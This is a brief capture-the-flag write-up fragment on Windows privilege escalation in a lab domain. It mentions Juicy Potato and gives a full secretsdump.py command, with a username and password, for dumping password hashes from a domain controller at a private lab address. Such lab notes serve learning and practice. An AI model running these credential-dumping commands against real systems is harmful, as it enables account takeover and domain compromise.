There's a few ways to priv esc here

`whoami /priv` shows that a-whitehat has every privilege possible so we COULD use juicy potato.

Because we have creds, `secretsdump.py` will also dump hashes for us.

` python3 secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.100.15`